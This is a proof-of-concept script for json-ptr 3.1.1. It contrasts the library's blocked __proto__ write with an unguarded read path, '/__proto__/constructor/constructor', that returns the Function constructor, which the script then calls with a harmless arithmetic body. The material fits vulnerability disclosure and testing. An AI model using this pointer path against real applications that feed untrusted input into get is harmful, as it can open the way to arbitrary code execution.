'use strict';
/**
 * json-ptr 3.1.1 — write guard present, read guard absent
 *
 *   npm i json-ptr@3.1.1
 *   node poc.js
 *
 * Expected: control PASS, set_guard PASS, read_bypass HIT.
 * The last block is OUR code calling the returned constructor — the library does not do it.
 */
const { JsonPointer } = require('json-ptr');

const show = (id, v) => console.log(`[${id}]`, v);

// control
show('control', JsonPointer.get({ user: { role: 'user' } }, '/user/role')); // "user"

// write side: blocked by design
try {
  JsonPointer.set({}, '/__proto__/polluted', 'x');
  show('set_guard', 'MISS - not blocked');
} catch (e) {
  show('set_guard', 'PASS - ' + e.message.slice(0, 60));
}

// read side: no check
const F = JsonPointer.get({}, '/__proto__/constructor/constructor');
show('read_bypass', typeof F === 'function' ? 'HIT - got Function' : 'MISS - ' + typeof F);

// ---- the following is the CONSUMER's behaviour, not the library's ----
if (typeof F === 'function') {
  show('caller_invokes', String(F('return 6*7')())); // 42 — requires the caller to invoke
}
